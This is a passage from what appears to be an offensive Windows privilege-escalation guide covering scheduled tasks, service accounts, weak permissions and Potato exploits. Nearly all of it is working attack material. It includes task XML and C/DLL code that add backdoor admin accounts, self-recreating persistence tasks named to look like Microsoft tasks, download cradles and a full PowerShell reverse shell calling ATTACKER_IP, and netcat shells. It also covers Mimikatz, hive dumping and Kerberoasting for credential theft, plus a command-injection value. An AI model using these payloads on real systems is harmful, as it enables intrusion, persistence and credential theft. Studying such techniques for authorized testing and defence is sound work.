schtasks /query /tn "TaskName" /fo LIST /v
schtasks /query /tn "\Microsoft\Windows\TaskName" /fo LIST /v
```

**Export task XML:**

```cmd
schtasks /query /tn "TaskName" /xml
schtasks /query /tn "TaskName" /xml > task.xml
```

**PowerShell detailed view:**

```powershell
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo
(Get-ScheduledTask -TaskName "TaskName").Actions
(Get-ScheduledTask -TaskName "TaskName").Triggers
(Get-ScheduledTask -TaskName "TaskName").Principal
```

**Enumerate tasks in specific path:**

```cmd
dir /s /b C:\Windows\System32\Tasks\
```

**Find tasks running as SYSTEM:**

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | ForEach-Object {
    [PSCustomObject]@{
        TaskName = $_.TaskName
        TaskPath = $_.TaskPath
        Actions = ($_.Actions.Execute -join ", ")
        State = $_.State
    }
}
```

#### Checking Task Permissions

**Check file permissions on task XML:**

```cmd
icacls C:\Windows\System32\Tasks\TaskName
accesschk.exe -quvw "C:\Windows\System32\Tasks\TaskName"
```

**PowerShell permission check:**

```powershell
Get-Acl "C:\Windows\System32\Tasks\TaskName" | Format-List
(Get-Acl "C:\Windows\System32\Tasks\TaskName").Access | Where-Object {$_.IdentityReference -notmatch "SYSTEM|Administrators"}
```

**Check permissions on task action binary:**

```cmd
rem First identify the binary path
schtasks /query /tn "TaskName" /fo LIST /v | findstr /i "Task To Run"

rem Then check permissions
icacls "C:\Path\To\Binary.exe"
accesschk.exe -quvw "C:\Path\To\Binary.exe"
```

**Look for writable task directories:**

```cmd
accesschk.exe -uwdqs Users C:\Windows\System32\Tasks\
accesschk.exe -uwdqs "Authenticated Users" C:\Windows\System32\Tasks\
```

#### Exploiting Writable Task Files

**Scenario:** Task XML file is writable by low-privileged user.

**Backup original task:**

```cmd
copy C:\Windows\System32\Tasks\VulnerableTask C:\temp\VulnerableTask.bak
```

**View task XML structure:**

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Original\Binary.exe</Command>
    </Exec>
  </Actions>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
</Task>
```

**Modify task to execute payload:**

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c net user attacker Password123! /add &amp;&amp; net localgroup administrators attacker /add</Arguments>
    </Exec>
  </Actions>
  <Triggers>
    <RegistrationTrigger>
      <Enabled>true</Enabled>
    </RegistrationTrigger>
  </Triggers>
</Task>
```

**Replace task file:**

```cmd
copy /Y modified_task.xml C:\Windows\System32\Tasks\VulnerableTask
```

**Trigger task execution:**

```cmd
schtasks /run /tn "VulnerableTask"
```

**Alternative payload - reverse shell:**

```xml
<Exec>
  <Command>powershell.exe</Command>
  <Arguments>-ep bypass -c "iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')"</Arguments>
</Exec>
```

#### Exploiting Writable Task Binaries

**Scenario:** Task executable has write permissions.

**Identify writable binary:**

```cmd
schtasks /query /tn "TaskName" /fo LIST /v | findstr /i "Task To Run"
icacls "C:\Program Files\Application\task.exe"
```

**Replace with malicious binary:**

```cmd
rem Backup original
copy "C:\Program Files\Application\task.exe" C:\temp\task.exe.bak

rem Replace with payload
copy /Y C:\temp\malicious.exe "C:\Program Files\Application\task.exe"
```

**Create wrapper binary (maintains functionality):**

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Execute payload
    system("cmd.exe /c net user attacker Password123! /add");
    system("cmd.exe /c net localgroup administrators attacker /add");
    
    // Execute original binary
    system("C:\\temp\\original.exe");
    
    return 0;
}
```

**Compile and replace:**

```cmd
gcc wrapper.c -o wrapper.exe
copy /Y wrapper.exe "C:\Program Files\Application\task.exe"
```

**Trigger task:**

```cmd
schtasks /run /tn "TaskName"
```

#### Modifying Existing Tasks

**Scenario:** Permissions allow task modification via schtasks or registry.

**Modify task action:**

```cmd
rem Delete and recreate with new action
schtasks /delete /tn "TaskName" /f
schtasks /create /tn "TaskName" /tr "cmd.exe /c net user attacker Password123! /add" /sc onstart /ru SYSTEM /rl HIGHEST /f
```

**Change task to run immediately:**

```cmd
schtasks /change /tn "TaskName" /st 00:00
schtasks /run /tn "TaskName"
```

**PowerShell task modification:**

```powershell
# Get existing task
$task = Get-ScheduledTask -TaskName "VulnerableTask"

# Create new action
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -enc <BASE64_PAYLOAD>"

# Update task
Set-ScheduledTask -TaskName "VulnerableTask" -Action $action

# Run task
Start-ScheduledTask -TaskName "VulnerableTask"
```

**Modify via registry:**

```cmd
rem Tasks stored in registry under:
rem HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks"
```

#### Creating New Privileged Tasks

**Scenario:** User has permissions to create tasks running as SYSTEM.

**Create task via schtasks:**

```cmd
rem Create task running as SYSTEM at logon
schtasks /create /tn "SystemMonitor" /tr "cmd.exe /c powershell -ep bypass -c iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')" /sc onlogon /ru SYSTEM /rl HIGHEST /f

rem Create task running immediately
schtasks /create /tn "UpdateCheck" /tr "C:\temp\payload.exe" /sc once /st 00:00 /ru SYSTEM /f
schtasks /run /tn "UpdateCheck"

rem Create task on system startup
schtasks /create /tn "BootTask" /tr "cmd.exe /c net user attacker Pass123! /add" /sc onstart /ru SYSTEM /f
```

**PowerShell task creation:**

```powershell
# Define action
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c net localgroup administrators attacker /add"

# Define trigger (at logon)
$trigger = New-ScheduledTaskTrigger -AtLogon

# Define principal (run as SYSTEM with highest privileges)
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Register task
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Principal $principal -Description "System Update Service"

# Execute immediately
Start-ScheduledTask -TaskName "WindowsUpdate"
```

**Create hidden task:**

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ep bypass -c <PAYLOAD>"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName ".SystemCache" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
```

#### Task Argument Injection

**Scenario:** Task executes script with user-controllable arguments.

**Identify vulnerable task:**

```cmd
schtasks /query /tn "TaskName" /fo LIST /v | findstr /i "Task To Run\|Arguments"
```

**Example vulnerable task:**

```
Task To Run: C:\Scripts\backup.bat
Arguments: %USERNAME%
```

**Exploitation via environment variable:**

```cmd
rem Set malicious environment variable
set USERNAME=victim & net user attacker Pass123! /add & rem

rem When task runs, it executes:
rem C:\Scripts\backup.bat victim & net user attacker Pass123! /add & rem
```

**Alternative - DLL hijacking in task:**

```cmd
rem If task runs: C:\App\program.exe
rem And C:\App is writable
copy malicious.dll C:\App\hijack.dll
```

#### Task Persistence and Stealth

**Create persistent scheduled task:**

```cmd
rem Task that recreates itself if deleted
schtasks /create /tn "WindowsDefender" /tr "powershell -c \"if (-not (Get-ScheduledTask -TaskName WindowsDefender -EA SilentlyContinue)) { schtasks /create /tn WindowsDefender /tr 'cmd /c <PAYLOAD>' /sc onlogon /ru SYSTEM /f }; <PAYLOAD>\"" /sc onlogon /ru SYSTEM /f
```

**Hide task from task scheduler GUI:**

```cmd
rem Create task in hidden path
mkdir C:\Windows\System32\Tasks\Microsoft\Windows\Hidden 2>nul
copy malicious_task.xml C:\Windows\System32\Tasks\Microsoft\Windows\Hidden\.Task
```

**Legitimate-looking task names:**

```cmd
schtasks /create /tn "\Microsoft\Windows\WindowsUpdate\Scheduled Start" /tr <PAYLOAD> /sc onlogon /ru SYSTEM /f
schtasks /create /tn "\Microsoft\Windows\Maintenance\WinSAT" /tr <PAYLOAD> /sc onlogon /ru SYSTEM /f
schtasks /create /tn "\Microsoft\Windows\Defrag\ScheduledDefrag" /tr <PAYLOAD> /sc onstart /ru SYSTEM /f
```

**Set task to run only when user is not logged in:**

```powershell
$task = Get-ScheduledTask -TaskName "BackdoorTask"
$task.Settings.RunOnlyIfIdle = $true
$task.Settings.IdleDuration = "PT10M"
$task | Set-ScheduledTask
```

#### PowerUp Scheduled Task Enumeration

**Using PowerUp for task abuse:**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')

# Find modifiable scheduled tasks
Get-ModifiableScheduledTaskFile

# Get all scheduled tasks with details
Get-ScheduledTask | Get-ScheduledTaskInfo
```

### Service Account Exploitation

Service accounts run Windows services with specific privileges. Compromising service account credentials or exploiting service misconfigurations enables privilege escalation.

#### Understanding Service Accounts

**Built-in service accounts:**

- **LocalSystem (NT AUTHORITY\SYSTEM)** - Highest privileges, full access to system
- **LocalService (NT AUTHORITY\LOCAL SERVICE)** - Limited privileges, network anonymous access
- **NetworkService (NT AUTHORITY\NETWORK SERVICE)** - Limited privileges, computer credentials on network
- **Virtual Accounts (NT SERVICE\ServiceName)** - Isolated service accounts

**Managed Service Accounts (MSA/gMSA):**

- Domain-managed accounts with automatic password rotation
- Cannot be used for interactive logon
- Group Managed Service Accounts (gMSA) for multiple servers

**Custom service accounts:**

- Domain or local user accounts configured to run services
- Often have excessive privileges
- Credentials may be stored insecurely

#### Enumerating Service Accounts

**List all services and their accounts:**

```cmd
wmic service get name,pathname,displayname,startmode,startname
sc query | findstr /i "SERVICE_NAME"
```

**PowerShell enumeration:**

```powershell
Get-WmiObject Win32_Service | Select-Object Name, DisplayName, PathName, StartName, State | Format-Table -AutoSize

Get-Service | ForEach-Object {
    $service = $_
    $startName = (Get-WmiObject Win32_Service -Filter "Name='$($service.Name)'").StartName
    [PSCustomObject]@{
        Name = $service.Name
        DisplayName = $service.DisplayName
        Status = $service.Status
        Account = $startName
    }
} | Format-Table -AutoSize
```

**Filter services running as SYSTEM:**

```cmd
wmic service where "startname='LocalSystem'" get name,pathname,startname
```

**Filter services running as custom accounts:**

```cmd
wmic service where "NOT startname='LocalSystem' AND NOT startname='NT AUTHORITY\\LocalService' AND NOT startname='NT AUTHORITY\\NetworkService'" get name,startname,pathname
```

**PowerShell - Find services with domain accounts:**

```powershell
Get-WmiObject Win32_Service | Where-Object {
    $_.StartName -notmatch "LocalSystem|NT AUTHORITY" -and $_.StartName -ne $null
} | Select-Object Name, DisplayName, StartName, PathName
```

#### Finding Service Account Credentials

**Check registry for stored credentials:**

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services /s /f password
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

**Search for credentials in service configurations:**

```cmd
sc qc ServiceName
reg query HKLM\SYSTEM\CurrentControlSet\Services\ServiceName
```

**PowerShell credential search:**

```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
    Get-ItemProperty $_.PSPath | Where-Object {
        $_ -match "password|pwd|pass"
    }
}
```

**Search configuration files:**

```cmd
findstr /si "password" C:\*.xml C:\*.ini C:\*.txt C:\*.config
dir /s /b C:\*password*.txt C:\*pass*.txt C:\*pwd*.txt
```

**PowerShell recursive search:**

```powershell
Get-ChildItem C:\ -Recurse -Include *.xml,*.ini,*.config,*.txt -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|pass" -ErrorAction SilentlyContinue
```

**Check application-specific locations:**

```cmd
rem IIS application pools
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*

rem SQL Server
type "C:\Program Files\Microsoft SQL Server\MSSQL*\MSSQL\Binn\*.cfg"

rem Apache/Tomcat
type C:\tomcat*\conf\tomcat-users.xml
```

#### Exploiting Weak Service Account Permissions

**Scenario:** Service runs as privileged account with weak file permissions.

**Identify service running as SYSTEM with writable binary:**

```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -wvu "C:\Program Files\VulnerableService\service.exe"
```

**PowerShell search for writable service binaries:**

```powershell
Get-WmiObject Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | ForEach-Object {
    $path = $_.PathName -replace '"','' -replace ' .*$',''
    if (Test-Path $path) {
        $acl = Get-Acl $path
        $acl.Access | Where-Object {
            $_.FileSystemRights -match "Write|FullControl|Modify" -and
            $_.IdentityReference -notmatch "SYSTEM|Administrators"
        } | ForEach-Object {
            [PSCustomObject]@{
                Service = $_.Name
                Path = $path
                Identity = $_.IdentityReference
                Rights = $_.FileSystemRights
            }
        }
    }
}
```

**Replace service binary:**

```cmd
rem Backup original
copy "C:\Program Files\VulnerableService\service.exe" C:\temp\service.bak

rem Replace with malicious service
copy C:\temp\malicious_service.exe "C:\Program Files\VulnerableService\service.exe"

rem Restart service
sc stop VulnerableService
sc start VulnerableService
```

#### Service Account Password Extraction

**Extract credentials from LSA Secrets:**

```cmd
rem Requires SYSTEM privileges
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM system.hive
```

**Use Mimikatz to extract:**

```cmd
mimikatz.exe
privilege::debug
token::elevate
lsadump::secrets
```

**Extract service account from memory:**

```cmd
mimikatz.exe
sekurlsa::logonpasswords
```

**PowerShell - Export registry hives:**

```powershell
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
reg save HKLM\SECURITY C:\temp\security.hive

# Transfer to attacker machine and crack with:
# secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
```

#### Kerberoasting Service Accounts

**Scenario:** Service account has SPN (Service Principal Name) registered in Active Directory.

**Request service tickets:**

```powershell
# Using PowerView
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat

# Using built-in Windows
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web.domain.com"

# Export tickets
mimikatz.exe
kerberos::list /export
```

**Extract and crack tickets:**

```bash
# On attacker machine with Impacket
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request

# Crack with Hashcat
hashcat -m 13100 spn_hashes.txt wordlist.txt
```

#### Service Account Privilege Escalation via SeImpersonatePrivilege

**[Inference]** Service accounts typically have SeImpersonatePrivilege, making them vulnerable to Potato exploits (covered in detail in SeImpersonate section below).

**Quick check:**

```cmd
whoami /priv | findstr SeImpersonatePrivilege
```

### Weak File/Folder Permissions

Weak NTFS permissions on critical system files, folders, or application directories allow unauthorized modification leading to privilege escalation.

#### Understanding Windows Permissions

**Permission types:**

- **Full Control (F)** - Complete access
- **Modify (M)** - Read, write, delete
- **Read & Execute (RX)** - Read and run executables
- **Read (R)** - View files/folders
- **Write (W)** - Create/modify files

**Permission inheritance:**

- **CI** - Container Inherit (folders)
- **OI** - Object Inherit (files)
- **IO** - Inherit Only
- **NP** - Do Not Propagate Inherit

**Common privilege groups:**

- **BUILTIN\Administrators** - Local administrators
- **BUILTIN\Users** - Standard users
- **NT AUTHORITY\Authenticated Users** - All authenticated users
- **Everyone** - All users including anonymous

#### Enumerating Weak Permissions

**Using icacls:**

```cmd
icacls "C:\Program Files"
icacls "C:\Windows" /t | findstr /i "BUILTIN\Users:F BUILTIN\Users:M BUILTIN\Users:W"
icacls "C:\Program Files\*" | findstr /i "BUILTIN\Users:(F) BUILTIN\Users:(M)"
```

**Using accesschk (Sysinternals):**

```cmd
rem Find writable directories
accesschk.exe -uwdqs Users C:\
accesschk.exe -uwdqs "Authenticated Users" C:\

rem Find writable files
accesschk.exe -uwqs Users C:\*.exe
accesschk.exe -uwqs Users "C:\Program Files\*"

rem Recursive search
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

**PowerShell permission enumeration:**

```powershell
# Function to check writable permissions
function Find-WritableDirectories {
    param([string]$Path = "C:\")
    
    Get-ChildItem $Path -Recurse -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
        $writable = $acl.Access | Where-Object {
            ($_.FileSystemRights -match "Write|FullControl|Modify") -and
            ($_.IdentityReference -match "Users|Everyone|Authenticated Users") -and
            ($_.AccessControlType -eq "Allow")
        }
        if ($writable) {
            [PSCustomObject]@{
                Path = $_.FullName
                Identity = ($writable.IdentityReference -join ", ")
                Rights = ($writable.FileSystemRights -join ", ")
            }
        }
    }
}

Find-WritableDirectories -Path "C:\Program Files"
```

**Search for world-writable files:**

```powershell
Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
    $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
    $acl.Access | Where-Object {
        $_.IdentityReference -eq "Everyone" -and
        $_.FileSystemRights -match "Write|FullControl" -and
        $_.AccessControlType -eq "Allow"
    }
} | Select-Object FullName
```

#### Exploiting Writable Program Directories

**Scenario:** Application directory in Program Files has write permissions for standard users.

**Check permissions:**

```cmd
icacls "C:\Program Files\VulnerableApp"
accesschk.exe -uwdq "C:\Program Files\VulnerableApp"
```

**DLL hijacking exploitation:**

```cmd
rem Identify loaded DLLs
tasklist /m /fi "imagename eq target.exe"

rem Check DLL search order
rem Application directory is checked first
```

**Create malicious DLL:**

```c
// malicious.dll
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        WinExec("cmd.exe /c net user attacker Pass123! /add && net localgroup administrators attacker /add", 0);
    }
    return TRUE;
}
```

**Compile and place DLL:**

```cmd
x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c
copy malicious.dll "C:\Program Files\VulnerableApp\missing.dll"
```

**Trigger DLL load:**

```cmd
rem Restart application or wait for automatic execution
```

#### Exploiting Writable System Directories

**Common vulnerable locations:**

```cmd
C:\
C:\Windows\Temp
C:\Windows\Tasks
C:\Windows\System32\config\systemprofile\AppData\Local
```

**Check system directory permissions:**

```cmd
icacls C:\Windows\System32 | findstr Users
icacls C:\Windows | findstr Users
```

**PATH directory exploitation:**

```cmd
rem Check PATH variable
echo %PATH%

rem If any PATH directory is writable, create malicious executable
echo @echo off > C:\Writable\Path\legitimate.exe
echo net user attacker Pass123! /add >> C:\Writable\Path\legitimate.exe
```

#### Exploiting Writable Application Config Files

**Search for writable config files:**

```cmd
dir /s /b C:\*.config C:\*.ini C:\*.xml | findstr /v "Windows\WinSxS"
```

**Check permissions on config files:**

```cmd
accesschk.exe -uwqs Users C:\*.config
icacls "C:\Program Files\App\app.config"
```

**Modify configuration for code execution:**

```xml
<!-- Example: Modify .NET app.config -->
<configuration>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
  </startup>
  <system.diagnostics>
    <trace autoflush="true">
      <listeners>
        <add name="malicious" type="System.Diagnostics.EventLogTraceListener" initializeData="cmd /c net user attacker Pass123! /add"/>
      </listeners>
    </trace>
  </system.diagnostics>
</configuration>
```

#### Exploiting Weak Folder Permissions on Startup Locations

**Common startup locations:**

```cmd
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
C:\Users\All Users\Microsoft\Windows\Start Menu\Programs\Startup
C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

**Check startup folder permissions:**

```cmd
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
accesschk.exe -uwdq "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

**Place malicious executable:**

```cmd
copy C:\temp\backdoor.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe"
```

**Create malicious shortcut:**

```vbscript
' Create startup.vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Update.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "cmd.exe"
oLink.Arguments = "/c powershell -ep bypass -c iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')"
oLink.WindowStyle = 7
oLink.Save
```

#### Exploiting Weak Registry Permissions

**Check registry key permissions:**

```cmd
accesschk.exe -kvuqsw hklm\system\currentcontrolset\services /accepteula
accesschk.exe -kvusw HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

**PowerShell registry permission check:**

```powershell
$acl = Get-Acl "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
$acl.Access | Where-Object {
    $_.IdentityReference -match "Users|Everyone" -and
    $_.RegistryRights -match "Write|FullControl"
}
```

**Exploit writable Run key:**

```cmd
rem Add malicious startup entry
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\payload.exe" /f
```

**Exploit writable service registry key:**

```cmd
rem Modify service ImagePath
reg add "HKLM\System\CurrentControlSet\Services\VulnerableService" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\malicious.exe" /f

rem Restart service
sc stop VulnerableService
sc start VulnerableService
```

#### PowerUp Weak Permission Enumeration

**Using PowerUp:**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')

# Find all weak permissions
Invoke-AllChecks

# Specific checks
Get-ModifiableFile
Get-ModifiableServiceFile
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
```

### SeImpersonate Token (Potato Exploits)

SeImpersonatePrivilege allows a process to impersonate a client after authentication. Service accounts typically have this privilege, enabling token impersonation attacks to escalate to SYSTEM.

#### Understanding SeImpersonatePrivilege

**What it allows:**

- Impersonate any token for which a handle can be obtained
- Act as another user without their password
- Escalate to SYSTEM if SYSTEM token can be obtained

**Accounts with SeImpersonatePrivilege:**

- LocalSystem
- NetworkService
- LocalService
- IIS application pool accounts (IIS APPPOOL\AppPoolName)
- SQL Server service accounts
- Custom service accounts

**Check current privileges:**

```cmd
whoami /priv
whoami /priv | findstr SeImpersonate
```

**PowerShell privilege check:**

```powershell
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$currentPrincipal.Identity.Groups | ForEach-Object {
    $_.Translate([Security.Principal.SecurityIdentifier])
}

# Check specific privilege
whoami /priv | Select-String "SeImpersonate"
```

**Verify privilege is enabled:**

```
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

#### Potato Exploit Evolution

**Exploit timeline and Windows version compatibility:**

**Hot Potato (2016)**

- **CVE:** CVE-2016-0051
- **Vulnerable:** Windows 7, 8, 10 (pre-2016), Server 2008, 2012
- **Method:** NBNS spoofing + NTLM relay
- **Status:** Patched in modern systems

**Rotten Potato (2016)**

- **Vulnerable:** Windows 7, 8, 10, Server 2008, 2012, 2016
- **Method:** COM/DCOM manipulation, BITS service abuse
- **Status:** Partially patched, requires specific configurations

**Juicy Potato (2018)**

- **Vulnerable:** Windows 7, 8, 10 (pre-1809), Server 2008, 2012, 2016
- **Method:** Enhanced Rotten Potato with CLSID manipulation
- **Status:** Patched in Windows 10 1809+ / Server 2019+

**Rogue Potato (2020)**

- **Vulnerable:** Windows 10 1809+, Server 2019+
- **Method:** Fake OXID resolver
- **Requirements:** Requires attacker-controlled endpoint
- **Status:** Effective on modern systems

**PrintSpoofer (2020)**

- **Vulnerable:** All Windows versions (including latest)
- **Method:** Print Spooler service abuse
- **Status:** Still effective if Print Spooler is running

**GodPotato (2022)**

- **Vulnerable:** Windows Server 2012 - 2022, Windows 8 - 11
- **Method:** RPC/DCOM manipulation
- **Status:** Currently effective on modern systems

#### Juicy Potato Exploitation

**Requirements:**

- SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enabled
- Windows 7, 8, 10 (pre-1809), Server 2008, 2012, 2016

**Download and transfer:**

```powershell
# On attacker machine
python3 -m http.server 80

# On target
certutil -urlcache -f http://ATTACKER_IP/JuicyPotato.exe C:\temp\jp.exe
# Or
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/JuicyPotato.exe','C:\temp\jp.exe')"
```

**Basic usage:**

```cmd
jp.exe -l 1337 -p cmd.exe -t * -c {CLSID}
```

**Parameters:**

- `-l` - COM server listening port
- `-p` - Program to launch
- `-a` - Arguments for program
- `-t` - CreateProcessWithToken type (0=CreateProcessWithTokenW, 1=CreateProcessAsUser, *=both)
- `-c` - CLSID (varies by Windows version)
- `-k` - RPC server IP (default 127.0.0.1)
- `-n` - RPC server port (default 135)

**Common CLSIDs by Windows version:**

**Windows 10 Enterprise:**

```
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
```

**Windows 10 Professional:**

```
{752073A1-23F2-4396-85F0-8FDB879ED0ED}
{E60687F7-01A1-40AA-86AC-DB1CBF673334}
```

**Windows Server 2016:**

```
{752073A1-23F2-4396-85F0-8FDB879ED0ED}
{5B3E6773-3A99-4A3D-8096-7765DD11785C}
```

**Windows Server 2012:**

```
{e60687f7-01a1-40aa-86ac-db1cbf673334}
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

**Windows Server 2008:**

```
{e60687f7-01a1-40aa-86ac-db1cbf673334}
{A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}
```

**Exploitation examples:**

**Add user:**

```cmd
jp.exe -l 1337 -p cmd.exe -a "/c net user attacker Password123! /add && net localgroup administrators attacker /add" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

**Execute reverse shell:**

```cmd
rem Create batch file with reverse shell
echo powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" > C:\temp\shell.bat

rem Execute with JuicyPotato
jp.exe -l 1337 -p C:\temp\shell.bat -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

**Execute binary as SYSTEM:**

```cmd
jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe ATTACKER_IP 4444" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

**Test multiple CLSIDs:**

```powershell
# PowerShell script to test CLSIDs
$clsids = @(
    "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}",
    "{752073A1-23F2-4396-85F0-8FDB879ED0ED}",
    "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
)

foreach ($clsid in $clsids) {
    Write-Host "Testing CLSID: $clsid"
    C:\temp\jp.exe -l 1337 -p C:\Windows\System32\whoami.exe -t * -c $clsid
    Start-Sleep -Seconds 2
}
```

#### Rogue Potato Exploitation

**Requirements:**

- SeImpersonatePrivilege enabled
- Windows 10 1809+, Server 2019+
- Network access to attacker-controlled machine

**Download and transfer:**

```cmd
certutil -urlcache -f http://ATTACKER_IP/RoguePotato.exe C:\temp\rp.exe
```

**Setup socat redirector on attacker machine:**

```bash
# Install socat
sudo apt install socat

# Create redirector on port 135
sudo socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999
```

**Execute RoguePotato:**

```cmd
rem Basic execution
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe" -l 9999

rem Add user
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe /c net user attacker Pass123! /add" -l 9999

rem Reverse shell
RoguePotato.exe -r ATTACKER_IP -e "powershell -ep bypass -c iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')" -l 9999
```

**Parameters:**

- `-r` - Attacker IP (redirector)
- `-e` - Command to execute
- `-l` - Local port for COM server
- `-p` - RPC port on attacker (default 135)

**Alternative with Metasploit:**

```bash
msfconsole
use exploit/windows/local/rogue_potato
set SESSION 1
set LHOST ATTACKER_IP
set LPORT 4444
exploit
```

#### PrintSpoofer Exploitation

**Requirements:**

- SeImpersonatePrivilege enabled
- Print Spooler service running
- Works on all Windows versions

**Check if Print Spooler is running:**

```cmd
sc query spooler
Get-Service -Name Spooler
```

**Download and transfer:**

```cmd
certutil -urlcache -f http://ATTACKER_IP/PrintSpoofer.exe C:\temp\ps.exe
```

**Basic exploitation:**

```cmd
rem Interactive shell
PrintSpoofer.exe -i -c cmd

rem Execute command
PrintSpoofer.exe -c "whoami"

rem Add user
PrintSpoofer.exe -c "net user attacker Password123! /add"
